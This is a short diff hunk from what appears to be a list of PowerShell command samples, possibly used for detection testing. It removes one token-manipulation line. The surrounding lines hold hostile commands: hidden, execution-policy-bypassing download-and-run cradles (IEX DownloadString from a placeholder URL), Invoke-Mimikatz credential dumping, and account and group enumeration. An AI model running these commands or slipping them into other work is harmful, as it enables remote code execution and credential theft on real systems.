@@ -26,7 +26,6 @@ powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command IEX (New-Object Net.We
 Get-WMIObject Win32_Group
 Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'
 $payload = [System.Text.Encoding]::Unicode.GetBytes("Invoke-Mimikatz")
-Invoke-TokenManipulation -CreateProcess 'cmd.exe' -ThreadId 500
 powershell.exe -exec bypass -c "Invoke-Mimikatz"
 $payload = 'IEX (New-Object Net.WebClient).DownloadString("http://somesurl.com/juve.ps1")'; Invoke-Expression $payload
 Get-WmiObject -Class Win32_UserAccount
